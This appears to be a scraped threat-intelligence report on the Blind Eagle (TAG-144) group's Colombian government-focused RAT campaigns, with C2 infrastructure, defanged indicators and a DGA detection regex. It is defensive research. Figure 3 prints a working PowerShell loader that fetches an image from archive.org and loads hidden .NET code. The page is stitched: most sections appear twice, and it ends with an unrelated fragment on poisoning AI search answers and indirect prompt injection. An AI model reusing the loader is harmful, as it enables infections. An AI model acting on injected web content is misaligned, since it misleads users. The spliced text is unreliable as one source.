IP addresses belonging to Colombian ISPs, such as <em>trabajonuevos[.]duckdns[.]org</em>. These IP addresses and their associated domains are detailed in <strong>Appendix A</strong>.

Network communications, as observed by Recorded Future Network Intelligence, began in March 2025 and ended in June 2025. Notably, the cessation of activity may indicate that the threat actors were either evicted, completed their objectives and withdrew voluntarily, or transitioned to other tooling and egress points.</p>\n        <p>As shown in <strong>Appendix C</strong>, multiple victims were observed communicating with several C2 servers associated with Cluster 1. This activity likely resulted from changes in DNS resolution for the C2 domains over time. In some instances, Insikt Group assesses that multiple infections occurred within the same victim network, with all compromised systems communicating with the C2 infrastructure through a shared egress point. In some cases, Insikt Group was unable to conclusively identify the exact victim due to multiple entities sharing the same name.</p>\n        <p><strong><em>Infrastructure Management</em></strong></p>\n        <p>Although the exact infrastructure management methods used by TAG-144 for Cluster 1 remain unclear at this time, Insikt Group identified indications that the threat group may have leveraged a compromised Mikrotik router as a proxy to communicate with the C2 servers over a port.</p>\n        <h3>Cluster 2</h3>\n        <p><strong><em>Infrastructure Analysis</em></strong></p>\n        <p>Cluster 2, active from at least September to December 2024, comprises C2 IP addresses primarily linked to AS-COLOCROSSING, Colombian ISP IP addresses, and, in at least one case, VULTR. It typically hosts <em>duckdns[.]org</em> or <em>con-ip[.]com</em> domains with specific naming patterns and has been observed deploying AsyncRAT. In a few cases, Insikt Group also observed domains linked to the free dynamic DNS provider <em>kozow[.]com</em>. The IP addresses linked to Cluster 2 are listed in <strong>Appendix D</strong>.</p>\n        <p>The subdomain names, likely generated by a DGA algorithm, often consist of Spanish words, as in <em>pesosdepesoslibras[.]duckdns[.]org</em>. Sometimes, they are followed by numbers, as in <em>paseoencarro2024[.]con-ip[.]com</em>. (For a detailed list of these subdomain names, see <strong>Appendix A</strong>.) Notably, many of the domains currently hosted on AS-COLOCROSSING IP addresses (see <strong>Appendix D</strong>) were previously associated with IPs from Colombian ISPs, such as <em>179[.]14[.]8[.]26</em>, <em>181[.]131[.]217[.]255</em>, <em>177[.]255[.]84[.]82</em>, and <em>191[.]88[.]248[.]162</em>, indicating they may have been reused across different hosting infrastructures.</p>\n        <p>In addition to the Spanish-themed domains, Insikt Group identified a large set of DuckDNS and CON-IP domains, likely generated by another DGA algorithm and all starting with the keyword “deadpoolstart,” followed by a four-digit number (see <strong>Appendix E</strong>). Notably, the <em>con-ip[.]com</em> domains resolve to the AS-COLOCROSSING IP address <em>64[.]188[.]9[.]172</em>, while the <em>duckdns[.]org</em> domains all resolve to IP addresses belonging to Colombian ISPs.</p>\n        <p><strong><em>Abuse of Legitimate Internet Services</em></strong></p>\n        <p>Similar to Cluster 1, Cluster 2 has also been observed leveraging various LIS during staging, including GitHub, Archive, Paste.ee, and more recently, the free hosting platform <em>lovestoblog[.]com</em> by InfinityFree, which ultimately <a href=\"https://tria.ge/250702-vahxmsyxav/behavioral3\">led</a> to an XWorm infection using the C2 domain <em>deadpoolstart2064[.]duckdns[.]org</em>.</p>\n        <p>Insikt Group also <a href=\"https://tria.ge/s?q=eeb8b79e875f78820e41f2d5f06fddd2338962e4e8ea046b974ab9f04e963d54\">identified</a> a payload named <code>RELACIÓN DE SALDOS - CUENTA DE COBRO.pdf.exe</code> associated with Cluster 2, which staged its content via two GitHub Gist URLs linked to the account SmikeY666:</p>\n        <ul>\n          <li><em>hxxps://gist[.]githubusercontent[.]com/SmikeY666/50447c53097f8884ffc754a8779fa2a3/raw</em></li>\n          <li><em>hxxps://gist[.]githubusercontent[.]com/SmikeY666/8504274482e8e688d9489b302bfbc45e/raw</em></li>\n        </ul>\n        <p>The payload <a href=\"https://tria.ge/s?q=eeb8b79e875f78820e41f2d5f06fddd2338962e4e8ea046b974ab9f04e963d54\">results</a> in an AsyncRAT infection, with the malware reaching out to its C2 server, <em>cococovid202420242024[.]duckdns[.]org</em>, which resolved to IP address <em>64[.]188[.]9[.]175</em> as of December 26, 2024.</p>\n        <p>Notably, the GitHub account “SmikeY666” included a link to a 2024 Vimeo video demonstrating an allegedly cracked version of SilverRAT, a Windows-based RAT that first <a href=\"https://www.cyfirma.com/research/a-gamer-turned-malware-developer-diving-into-silverrat-and-its-syrian-roots/\">appeared</a> in 2023. It has been distributed across various forums and appears to be developed by an individual or group using the alias Anonymous Arabic.</p>\n        <p><strong><em>Malware</em></strong></p>\n        <p>Insikt Group observed Cluster 2 using the AsyncRAT variant labeled “CRACKED BY hxxps://t[.]me/xworm_v2” with the mutex <code>AsyncMutex_6SI8OkPnk</code>. Additionally, the cluster deployed AsyncRAT samples featuring custom mutexes such as <code>tempcookieess</code>, <code>tempcokies</code>, <code>tempcookiee</code>, <code>WinCookies</code>, <code>Cookies</code>, and <code>CookiesGoogleChrome</code>, among others. These samples can be tracked via Recorded Future Malware Intelligence. At least some of the samples <a href=\"https://tria.ge/241001-xkwycsvglk\">are</a> encrypted using a crypter attributed to Roda, a tool <a href=\"https://www.esentire.com/blog/blind-eagles-north-american-journey\">associated</a> with Blind Eagle activity.</p>\n        <p><strong><em>Victimology</em></strong></p>\n        <p>Using Recorded Future Network Intelligence, Insikt Group identified nine victims associated with Cluster 2, primarily linked to Colombian government entities, along with victims from the education, defense, and retail sectors, among others (see <strong>Appendix F</strong>). Network communications observed by Recorded Future began in early October 2024 and ended in December 2024.</p>\n        <p>As with Cluster 1, multiple infections were observed within some of the victim organizations linked to Cluster 2, suggesting broader targeting or possible lateral movement. There is also evidence of victim overlap between Clusters 1 and 2. Furthermore, based on high volumes of network traffic from Colombian ISP IP addresses to C2 ports during the relevant timeframes, the actual number of victims is likely higher than what has been confirmed.</p>\n        <h3>Cluster 3</h3>\n        <p>Cluster 3, active from at least September 2024 to July 2025, comprises C2 IP addresses primarily linked to the Colombian ISP UNE EPM, typically hosting DuckDNS or, in rare cases, <em>con-ip[.]com</em>, domains. Insikt Group has observed AsyncRAT as well as REMCOS RAT infections linked to Cluster 3. The IP addresses linked to Cluster 3 are listed in <strong>Appendix G</strong>.</p>\n        <p>The subdomain names, likely generated using a domain DGA, often incorporate Spanish names, as in <em>sebastiancorrea905040[.]duckdns[.]org</em>, sometimes appended with numerical sequences. (For a detailed list of these subdomain names, see <strong>Appendix B</strong>.) Notably, one of the domains associated with Cluster 3, <em>sebastianguerrero5040[.]con-ip[.]com</em>, was observed resolving to the Cluster 2 IP address <em>64[.]188[.]9[.]177</em> between at least September 11 and November 11, 2024.</p>\n        <p>Similar to Clusters 1 and 2, Cluster 3 has also been observed abusing multiple LIS, including Tagbox, Archive, and Paste.ee, among others.</p>\n        <h3>Cluster 4</h3>\n        <p>Cluster 4, active from at least May 2024 to February 2025, differs from the others in that it is not only associated with malware infrastructure but also with phishing activity attributed to TAG-144. The IP addresses linked to Cluster 4 are listed in <strong>Appendix H</strong>. The full list of domains linked to the IP addresses in <strong>Appendix H</strong> is listed in <strong>Appendix A</strong>.</p>\n        <p>The phishing pages linked to Cluster 4 have been observed impersonating multiple banks, including Banco Davivienda, Bancolombia, and BBVA (see <strong>Figure 5</strong>). Notably, these lures differ from earlier ones attributed to TAG-144, which primarily impersonated government entities such as tax authorities or judicial bodies. Previous campaigns also appeared to target government-affiliated individuals or organizations, as evidenced by the victims associated with Clusters 1 and 2.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1340f098ea297aa5ad03c0694fac9811b58e6cf1e.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1f518fa040a8d017faf3f8a5f8deda6a43620d784.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_16bab54dc9f3bace27a6e7c7773ca3676f8219158.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n          </div>\n        </div>\n        <p><strong>Figure 5:</strong> Phishing pages linked to Cluster 4 (Source: <a href=\"https://urlscan.io/result/984376cf-9e75-480d-9883-e6eaf41a8491\">URLScan</a>, <a href=\"https://urlscan.io/result/4ebbe460-c1db-45b5-9af8-d612e39a9417\">URLScan</a>, <a href=\"https://urlscan.io/result/645edc12-ed71-4290-9fa2-5fa6646028c9\">URLScan</a>)</p>\n        <p>Notably, a phishing page impersonating BBVA and hosted on the domain <em>keepz[.]duckdns[.]org</em> contained the IP address <em>181[.]131[.]217[.]139</em> in its document object model (DOM), as seen in <strong>Figure 6</strong>.

These clusters have operated at various times throughout 2024 and 2025, targeting a significant number of victims, primarily within the Colombian government across local, municipal, and federal levels. Although the clusters share similar tactics, techniques, and procedures (TTPs) such as leveraging open-source and cracked remote access trojans (RATs), dynamic domain providers, and legitimate internet services (LIS) for staging, they differ significantly in infrastructure, malware deployment, and other operational methods. Insikt Group also found further evidence linking TAG-144 to Red Akodon and identified various compromised Colombian government email accounts likely used in spearphishing campaigns.\nTo protect against TAG-144, security defenders should block IP addresses and domains tied to associated RATs, flag and potentially block connections to unusual LIS, and deploy updated detection rules (YARA, Sigma, Snort) for current and historic infections. Other controls include implementing email filtering and data exfiltration monitoring. See the Mitigations section for implementation guidance and Appendix B for a complete list of IoCs. In the long term, analysts should continuously monitor the cybercriminal ecosystem for emerging threats and adapt controls accordingly.\nKey Findings\nInsikt Group has tracked five distinct activity clusters associated with TAG-144 (Blind Eagle), each displaying overlapping yet varied TTPs and collectively targeting numerous victims, primarily within the Colombian government, throughout 2024 and 2025.\nTAG-144 appears to maintain an extensive operational infrastructure, comprising virtual private servers (VPS), IP addresses within Colombian ISP ranges, and servers that appear to function as VPN servers. These typically host domains registered through various dynamic DNS services such as duckdns[.]org, noip[.]com, and con-ip[.]com, among others.\nTAG-144 has employed a wide array of open-source and cracked RATs, including AsyncRAT, DcRAT, REMCOS RAT, XWorm, and LimeRAT, among others. These payloads are typically deployed through a multi-stage infection chain that leverages an expanding set of LIS and uses steganography to obscure malicious content and evade detection.\nBackground\nTAG-144, also known as Blind Eagle, AguilaCiega, APT-C-36, and APT-Q-98, is a threat group that has been active since at least 2018, primarily targeting South America, especially Colombia. While the threat group’s overall motivation remains ambiguous, its activity reflects both cyber-espionage and financially driven motivations. TAG-144’s primary focus appears to be on credential theft, evidenced by banking-related keylogging and browser monitoring, alongside indications of espionage, such as persistently targeting government entities and using modified RATs with surveillance functions (1, 2).\nThe group’s primary targets include government institutions, especially judiciary and tax authorities, alongside financial entities, petroleum and energy companies, and organizations within the education, healthcare, manufacturing, and professional services sectors (1, 2). Operations are mainly focused on Colombia, with additional activity in Ecuador, Chile, and Panama, and occasional campaigns in North America targeting Spanish-speaking users.\nInitial access typically occurs through spearphishing campaigns impersonating local government agencies, most notably Colombian authorities. These campaigns leverage themes such as debt collection and judicial notifications to lure victims into opening malicious documents (1, 2). They have often used URL shorteners like cort[.]as, acortaurl[.]com, and gtly[.]to to conceal malicious links and target users geographically. TAG-144 employs geo-fencing and other detection evasion measures that block access from outside Colombia or Ecuador, redirecting outsiders to official government websites. TAG-144 has consistently leveraged compromised email accounts in its spearphishing campaigns, including those associated with government entities and private individuals.\nTAG-144 leverages a range of commodity remote access trojans (RATs), including AsyncRAT, REMCOS RAT, DcRAT, njRAT, LimeRAT, QuasarRAT, BitRAT, and a Quasar variant known as BlotchyQuasar. Its tooling also involves crypters such as HeartCrypt, PureCrypter, and those developed by threat actors like “Roda” and “pjoao1578”, with indicators pointing to the use of crypter-as-a-service offerings such as CryptersAndTools, which originates from Brazil. Additionally, it employs steganography techniques, embedding malicious payloads within image files to evade detection.\nTAG-144’s command-and-control (C2) infrastructure often incorporates IP addresses from Colombian ISPs alongside virtual private servers (VPS) such as Proton666 and VPN services like Powerhouse Management, FrootVPN, and TorGuard (1, 2). This setup is further enhanced by the use of dynamic DNS services, including duckdns[.]org, ip-ddns[.]com, and noip[.]com. The threat group is suspected, though not definitively confirmed, to use compromised routers, which are then repurposed as reverse proxies to obscure the true locations of their C2 servers and complicate attribution.\nThe threat group has consistently leveraged LIS, particularly during the payload staging phase. These services include widely used platforms like Bitbucket, Discord, Dropbox, GitHub, Google Drive, Paste.ee, and lesser-known platforms such as undisclosed Brazilian image-hosting websites. Additionally, the group has been observed using compromised accounts to host malicious content, including a Google Drive folder tied to a compromised account associated with a regional Colombian government organization.\nThe threat group's origin remains uncertain, though multiple studies suggest it operates within the UTC-5 or UTC-4 time zones (1, 2), consistent with countries like Colombia and Ecuador, with some research specifically pointing to Colombia as its base. Notably, technical artifacts have contained both Spanish- and Portuguese-language comments. The Spanish observed in the comments closely resembles the regional dialects commonly spoken in the targeted countries. Additionally, the threat group has been observed using tools and services tied to the Brazilian cybercriminal underground, indicating a possible connection with Brazilian threat actors.\nThree key factors set TAG-144 apart within the cybercriminal ecosystem. First, while globalization, cybercriminal collaboration, and hardware/software standardization have lowered barriers for threat actors to operate globally, threat actors, including TAG-144, often remain regionally focused due to cultural nuances, tacit knowledge, and persistence. Second, despite some tooling improvements, TAG-144 has largely relied on consistent techniques since its emergence. Their continued success, reflected in a high number of victims, underscores how well-established methods remain effective over time. Lastly, TAG-144 exemplifies the increasingly blurred lines between cybercrime and espionage, a trend that has become more prominent in the coming year. In this context, a comprehensive approach to tackling cyber threats becomes even more crucial, requiring improved defenses, deeper regional knowledge, and enhanced coordination.\nThreat Analysis\nInsikt Group identified five activity clusters associated with TAG-144 that were active between May 2024 and July 2025 (see Figure 1). Activity periods were determined based on domain resolutions, sample submissions, and victim traffic, as observed through Recorded Future® Network Intelligence.\nFigure 1: Cluster activity timelines (Source: Recorded Future)\nThe following clusters have been observed:\nCluster 1, active from February through July 2025, comprises C2 IPs primarily associated with TorGuard VPN and one Colombian ISP hosting duckdns[.]org and, starting in July 2025, noip[.]com domains with static resolution and minimal rotation. Cluster 1 is linked to DcRAT, AsyncRAT, and REMCOS RAT infections targeting Colombian government entities exclusively.\nCluster 2, active between September and December 2024, included C2 IPs tied to AS-COLOCROSSING, Colombian ISPs, and VULTR hosting duckdns[.]org, con-ip[.]com, and kozow[.]com domains. Cluster 2 is associated with AsyncRAT activity targeting the Colombian government and entities in the education, defense, and retail sectors.\nCluster 3, active from September 2024 to July 2025, consists of C2 IPs linked to Colombian ISP UNE EPM hosting duckdns[.]org and, occasionally, con-ip[.]com domains. Cluster 3 is associated with both AsyncRAT and REMCOS RAT deployments.\nCluster 4, active from May 2024 to February 2025, is notable for combining malware and phishing infrastructure attributed to TAG-144.\nCluster 5, active from March to July 2025, consists of C2 IPs linked to GLESYS (AS42708) hosting dynamically resolving duckdns[.]org domains. Cluster 5 is associated with LimeRAT and a cracked AsyncRAT variant seen in Clusters 1 and 2.\nInsikt Group identified infrastructure overlaps between the clusters, establishing a connection among them. Additionally, the clusters share notable similarities in TTPs, including infrastructure choices, domain naming patterns, malware deployment, and the abuse of LIS. However, each cluster also exhibits distinct differences, which are explored in detail in the following sections of this report.\nCluster 1\nInfrastructure Analysis\nCluster 1, active from at least February through July 2025, comprises C2 IP addresses primarily linked to TorGuard VPN servers and, in one case, a Colombian ISP. This cluster typically hosts duckdns[.]org and, more recently, noip[.]com domains with specific naming patterns; it has also been observed deploying DcRAT, AsyncRAT, and REMCOS RAT. The IP addresses linked to Cluster 1 are listed in Appendix A. The domains consistently resolve to the same static IP addresses over time, with minimal rotation observed within Cluster 1.\nThe subdomain names, likely generated by a domain generation algorithm (DGA), commonly include the word “envio” followed by a numeric part, as in, for example, envio16-05[.]duckdns[.]org. The names are detectable via the regex in Figure 2 and are detailed in Appendix B.\nenvio[0-9\\-]{2,5}\\.duckdns\\.org\nFigure 2: Regex for suspected DGA linked to Cluster 1 (Source: Recorded Future)\nWhile prior research has suggested that the TorGuard VPN servers associated with Cluster 1 are used for port forwarding, the exposure of C2 components, such as default transport layer security (TLS) certificates tied to deployed malware families, indicates these IP addresses are likely dedicated VPN instances directly controlled by TAG-144.\nIn addition to the TorGuard VPN servers, Cluster 1 includes IP addresses associated with Colombian ISPs, such as Colombia’s primary provider, COLOMBIA TELECOMUNICACIONES S.A. E.S.P. While earlier reporting on Blind Eagle in 2020 suggested the possible use of compromised routers for C2 infrastructure, Insikt Group has not confirmed such activity for the observed IP addresses.\nNotably, several domains hosted on TorGuard VPN servers listed in Appendix A were previously resolved to IP addresses belonging to Colombian ISPs, such as trabajonuevos[.]duckdns[.]org. These IP addresses and their associated domains are detailed in Appendix A. Similarly, certain domains, such as diazpool14[.]duckdns[.]org, were previously hosted on IP addresses linked to GLESYS (AS42708), an ASN identified in association with Cluster 5.\nAbuse of Legitimate Internet Services, Including lovestoblog[.]com\nAs is typical for TAG-144, Cluster 1 has leveraged various LIS during staging, such as Tagbox, Archive, Paste.ee, Discord, and BitBucket, and for the first time in TAG-144 activity, the free hosting platform lovestoblog[.]com by InfinityFree. More specifically, the subdomain sudo102[.]lovestoblog[.]com hosted several text files that loaded an encoded PowerShell script, which retrieved the next stage of the infection chain from a JPG image hosted on archive[.]org. (See Figure 3 for the infection chain; line breaks were added for readability.)\n$craploads = 'SilentlyContinue'\n$islamist = 'https://archive[.]org/download/new_image_20250531_1942/new_image.jpg'\n$seiche = New-Object System.Net.WebClient\n$seiche.Headers.Add('User-Agent', 'Mozilla/5.0')\n[byte[]]$homophobes = $seiche.DownloadData($islamist)\n$rythmic = [System.Text.Encoding]::UTF8.GetString($homophobes)\n\n$protamphirhine = 'INICIO>>'\n$unrubberized = '<<FIM>>'\n$petrograph = $ither\n\n$formylation = $rythmic.IndexOf($protamphirhine)\n$inconveniency = $rythmic.IndexOf($unrubberized)\n\nif ($formylation -ne -1 -and $inconveniency -ne -1 -and $inconveniency -gt $formylation) {\n    $formylation += $protamphirhine.Length\n    $petrograph = $rythmic.Substring($formylation, $inconveniency - $formylation)\n}\n\n$higgsinos = '#x#.e13ba2379fd20168b9c460418b963234_oviuqra/moc.golbo#sevol.201odus//:p##h'\n$higgsinos = $higgsinos.Replace('#', 't')\n$petrograph = $petrograph.Replace('@', 'A')\n\n$MacArthur = [System.Convert]::FromBase64String($petrograph)\n$aginator = [Reflection.Assembly]::Load($MacArthur)\n\n$towelette = [dnlib.IO.Home].GetMethod('VAI').Invoke(\n    $ither,\n    [object[]]@(\n        $higgsinos,\n        '', '', '',\n        'MSBuild', '', '', '', '',\n        'C:\\Users\\Public\\Downloads',\n        'Mattagami',\n        'js', '', '',\n        'duparted',\n        '2', ''\n    )\n)\n\nFigure 3: Payload hosted on archive[.]org URL (Source: Recorded Future)\nAt least one text file hosted on sudo102[.]lovestoblog[.]com included comments in Portuguese (for example, “Junta os comandos,” which translates to “Add the commands”), a characteristic previously observed in connection with Blind Eagle (1, 2). This was suspected to indicate possible collaboration between the threat actor and external threat groups; however, it could also be explained by the presence of Portuguese-speaking members, code reuse, or intentional false flag operations.\nMalware\nInsikt Group observed Cluster 1 using both the “1.0.7” version of AsyncRAT and a variant labeled “CRACKED BY hxxps://t[.]me/xworm_v2”, which has the mutex AsyncMutex_6SI8OkPnk. xworm_v2 is an active Telegram channel with over 300 members, known for sharing and distributing cracked versions of paid software.\nFigure 4: Telegram channel hxxps://t[.]me/xworm_v2 (Source: Recorded Future)\nThe cracked version observed in connection with TAG-144 was linked to a threat actor tracked as Red Akodon in May 2024; it appeared again in June 2025 in a report potentially referencing the same threat actor based on observed TTPs, though without formal attribution.\nVictimology\nUsing Recorded Future Network Intelligence, Insikt Group identified a significant number of victims exclusively linked to the Colombian government associated with Cluster 1 (see Appendix C). Network communications, as observed by Recorded Future Network Intelligence, began in March 2025 and ended in June 2025. Notably, the cessation of activity may indicate that the threat actors were either evicted, completed their objectives and withdrew voluntarily, or transitioned to other tooling and egress points.\nAs shown in Appendix C, multiple victims were observed communicating with several C2 servers associated with Cluster 1. This activity likely resulted from changes in DNS resolution for the C2 domains over time. In some instances, Insikt Group assesses that multiple infections occurred within the same victim network, with all compromised systems communicating with the C2 infrastructure through a shared egress point. In some cases, Insikt Group was unable to conclusively identify the exact victim due to multiple entities sharing the same name.\nInfrastructure Management\nAlthough the exact infrastructure management methods used by TAG-144 for Cluster 1 remain unclear at this time, Insikt Group identified indications that the threat group may have leveraged a compromised Mikrotik router as a proxy to communicate with the C2 servers over a port.\nCluster 2\nInfrastructure Analysis\nCluster 2, active from at least September to December 2024, comprises C2 IP addresses primarily linked to AS-COLOCROSSING, Colombian ISP IP addresses, and, in at least one case, VULTR. It typically hosts duckdns[.]org or con-ip[.]com domains with specific naming patterns and has been observed deploying AsyncRAT. In a few cases, Insikt Group also observed domains linked to the free dynamic DNS provider kozow[.]com. The IP addresses linked to Cluster 2 are listed in Appendix D.\nThe subdomain names, likely generated by a DGA algorithm, often consist of Spanish words, as in pesosdepesoslibras[.]duckdns[.]org. Sometimes, they are followed by numbers, as in paseoencarro2024[.]con-ip[.]com. (For a detailed list of these subdomain names, see Appendix A.) Notably, many of the domains currently hosted on AS-COLOCROSSING IP addresses (see Appendix D) were previously associated with IPs from Colombian ISPs, such as 179[.]14[.]8[.]26, 181[.]131[.]217[.]255, 177[.]255[.]84[.]82, and 191[.]88[.]248[.]162, indicating they may have been reused across different hosting infrastructures.\nIn addition to the Spanish-themed domains, Insikt Group identified a large set of DuckDNS and CON-IP domains, likely generated by another DGA algorithm and all starting with the keyword “deadpoolstart,” followed by a four-digit number (see Appendix E). Notably, the con-ip[.]com domains resolve to the AS-COLOCROSSING IP address 64[.]188[.]9[.]172, while the duckdns[.]org domains all resolve to IP addresses belonging to Colombian ISPs.\nAbuse of Legitimate Internet Services\nSimilar to Cluster 1, Cluster 2 has also been observed leveraging various LIS during staging, including GitHub, Archive, Paste.ee, and more recently, the free hosting platform lovestoblog[.]com by InfinityFree, which ultimately led to an XWorm infection using the C2 domain deadpoolstart2064[.]duckdns[.]org.\nInsikt Group also identified a payload named RELACIÓN DE SALDOS - CUENTA DE COBRO.pdf.exe associated with Cluster 2, which staged its content via two GitHub Gist URLs linked to the account SmikeY666:\nhxxps://gist[.]githubusercontent[.]com/SmikeY666/50447c53097f8884ffc754a8779fa2a3/raw\nhxxps://gist[.]githubusercontent[.]com/SmikeY666/8504274482e8e688d9489b302bfbc45e/raw\nThe payload results in an AsyncRAT infection, with the malware reaching out to its C2 server, cococovid202420242024[.]duckdns[.]org, which resolved to IP address 64[.]188[.]9[.]175 as of December 26, 2024.\nNotably, the GitHub account “SmikeY666” included a link to a 2024 Vimeo video demonstrating an allegedly cracked version of SilverRAT, a Windows-based RAT that first appeared in 2023. It has been distributed across various forums and appears to be developed by an individual or group using the alias Anonymous Arabic.\nMalware\nInsikt Group observed Cluster 2 using the AsyncRAT variant labeled “CRACKED BY hxxps://t[.]me/xworm_v2” with the mutex AsyncMutex_6SI8OkPnk. Additionally, the cluster deployed AsyncRAT samples featuring custom mutexes such as tempcookieess, tempcokies, tempcookiee, WinCookies, Cookies, and CookiesGoogleChrome, among others. These samples can be tracked via Recorded Future Malware Intelligence. At least some of the samples are encrypted using a crypter attributed to Roda, a tool associated with Blind Eagle activity.\nVictimology\nUsing Recorded Future Network Intelligence, Insikt Group identified nine victims associated with Cluster 2, primarily linked to Colombian government entities, along with victims from the education, defense, and retail sectors, among others (see Appendix F). Network communications observed by Recorded Future began in early October 2024 and ended in December 2024.\nAs with Cluster 1, multiple infections were observed within some of the victim organizations linked to Cluster 2, suggesting broader targeting or possible lateral movement. There is also evidence of victim overlap between Clusters 1 and 2. Furthermore, based on high volumes of network traffic from Colombian ISP IP addresses to C2 ports during the relevant timeframes, the actual number of victims is likely higher than what has been confirmed.\nCluster 3\nCluster 3, active from at least September 2024 to July 2025, comprises C2 IP addresses primarily linked to the Colombian ISP UNE EPM, typically hosting DuckDNS or, in rare cases, con-ip[.]com, domains. Insikt Group has observed AsyncRAT as well as REMCOS RAT infections linked to Cluster 3. The IP addresses linked to Cluster 3 are listed in Appendix G.\nThe subdomain names, likely generated using a domain DGA, often incorporate Spanish names, as in sebastiancorrea905040[.]duckdns[.]org, sometimes appended with numerical sequences. (For a detailed list of these subdomain names, see Appendix B.) Notably, one of the domains associated with Cluster 3, sebastianguerrero5040[.]con-ip[.]com, was observed resolving to the Cluster 2 IP address 64[.]188[.]9[.]177 between at least September 11 and November 11, 2024.\nSimilar to Clusters 1 and 2, Cluster 3 has also been observed abusing multiple LIS, including Tagbox, Archive, and Paste.ee, among others.\nCluster 4\nCluster 4, active from at least May 2024 to February 2025, differs from the others in that it is not only associated with malware infrastructure but also with phishing activity attributed to TAG-144. The IP addresses linked to Cluster 4 are listed in Appendix H. The full list of domains linked to the IP addresses in Appendix H is listed in Appendix A.\nThe phishing pages linked to Cluster 4 have been observed impersonating multiple banks, including Banco Davivienda, Bancolombia, and BBVA (see Figure 5). Notably, these lures differ from earlier ones attributed to TAG-144, which primarily impersonated government entities such as tax authorities or judicial bodies. Previous campaigns also appeared to target government-affiliated individuals or organizations, as evidenced by the victims associated with Clusters 1 and 2.\nFigure 5: Phishing pages linked to Cluster 4 (Source: URLScan, URLScan, URLScan)\nNotably, a phishing page impersonating BBVA and hosted on the domain keepz[.]duckdns[.]org contained the IP address 181[.]131[.]217[.]139 in its document object model (DOM), as seen in Figure 6. This IP was hosting the domains env2023nue[.]duckdns[.]org and chichichi01[.]duckdns[.]org in 2023. The domain env2023nue[.]duckdns[.]org was publicly linked to APT-C-36 (Blind Eagle) and likely remained in use by the same threat actor, as it continued to host an open directory containing folders related to Banco Davivienda, Banco Colombia, Banco Caja Social, and others until at least March 14, 2024, while being hosted on IP address 179[.]14[.]9[.]152. The domain chichichi01[.]duckdns[.]org served as a C2 domain for AsyncRAT based on public reporting and was also hosted on IP address 179[.]14[.]9[.]152 between March 22 and May 8, 2024.\n…\n    <footer class=\"d-flex justify-content-center\">\n        <p>\n            Dirección IP: 181[.]131[.]217[.]139\n        </p>\n        <p>\n            Copyright©2023 Bancolombia S.A.\n        </p>\n    </footer>\n…\n\nFigure 6: IP address left in the DOM of a phishing page (Source: URLScan)\nCluster 5\nCluster 5, which has been active since at least March to July 2025, comprises C2 IP addresses primarily linked to GLESYS (AS42708), typically hosting duckdns[.]org domains. The domains linked to Cluster 5 are listed in Appendix I. Cluster 5 is the only cluster associated with the deployment of LimeRAT, which in this case uses the mutex 1e97ead369. The AsyncRAT variant linked to Cluster 5 is the same cracked version identified in Clusters 1 and 2.

The migration from search engines to conversational AI doesn't require sophisticated new attacks; it rewards the same content manipulation strategies, amplified through AI's tendency to synthesize and propagate.</p>\n        <p>Classic Search Engine Optimization (SEO) poisoning already proved resilient at scale: <a href=\"https://go.recordedfuture.com/hubfs/reports/cta-2024-0513.pdf\">SolarMarker</a> and peers used tiered infrastructure and content farms to meet victims at intent, then route them through filtering gates. The only real change now is the front door: from Search Engine Results Page (SERPs) to AI overviews and chat answers.</p>\n        <p>Simultaneously, <a href=\"https://arxiv.org/pdf/2311.09735\">“Generative Engine Optimization” (GEO)</a> and early <a href=\"https://dl.acm.org/doi/10.1145/3637528.3671900https://dl.acm.org/doi/10.1145/3637528.3671900\">LLM-optimization (LLMO) research</a> show that content presentation, citations, and entity structure measurably influence which sources appear in AI answers. That creates a new, gameable funnel that criminals can exploit.</p>\n        <p>Traffic distribution syndicates like TAG-124 already control vast networks of compromised and synthetic websites. These existing assets become exponentially more valuable when LLMs treat them as legitimate sources, transforming criminal infrastructure into AI-recommended destinations.</p>\n        <h2>From SERP Hijacks to Answer Hijacks</h2>\n        <p>The playbook shifts from ranking pages to <strong>being cited</strong> or <strong>embedded</strong> in answers a user trusts. <a href=\"https://www.theguardian.com/technology/2024/nov/03/the-chatbot-optimisation-game-can-we-trust-ai-web-searches\">Studies and investigations</a> have already shown that AI search can prioritize superficially relevant sources, is vulnerable to hidden content, and can be induced to output attacker-preferred code or links. TDS operators excel at exploiting these seams.</p>\n        <p>Modern LLMs retrieve real-time information through web searches, processing results to formulate responses. This retrieval-augmented generation (RAG) creates a massive attack surface that TDS operators will exploit through volume and velocity.</p>\n        <p><a href=\"https://msrc.microsoft.com/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks/\">Microsoft</a> and others have warned about <strong>indirect prompt injection</strong>—malicious instructions planted in web content that LLM-powered systems later ingest during browsing and tool use. A TDS that already fingerprints bots and visitors will happily add “LLM-aware” personalities to feed chatbots one thing and humans another.</p>\n        <p>The math favors TDS operators. OpenAI's GPT-4 web browsing processes approximately 10-20 sources per complex query. Controlling just 2-3 of those sources through SEO manipulation translates to 15-30% influence over the model's response. Current TDS operations already achieve similar ratios in traditional search results.</p>\n        <p>If generative engines reward crisp citations, entity markup, and quotable stats, then TDS crews will industrialize answer-optimized microsites designed to be pulled verbatim into AI responses. Expect schema.org-heavy pages, FAQ blocks, and quote-bait paragraphs engineered for GEO visibility. The objective <strong>isn’t rank</strong>; it is <strong>inclusion in the answer</strong> that becomes the user’s first click.</p>\n        <p>Generative engines are also a <strong>trust amplifier</strong>; users treat summarized answers as vetted, improving conversion on soft prompts like “download,” “join Discord,” or “install the helper.” That trust premium is exactly what TDS operators rent to malware payload crews.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_118f94168f8f11d23d1793b6f1defb5b1ca4505d6.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1536\" height=\"1024\" />\n            </div>\n          </div>\n          <div>\n            <div><em>GEO poisoning - AI render</em></div>\n          </div>\n        </div>\n        <p>Criminal syndicates will adapt existing infrastructure:</p>\n        <ul>\n          <li><strong>Domain aging farms</strong>: Establishing thousands of domains years in advance, building synthetic credibility</li>\n          <li><strong>Content velocity attacks</strong>: Publishing 50,000+ articles daily across compromised sites during high-value events</li>\n          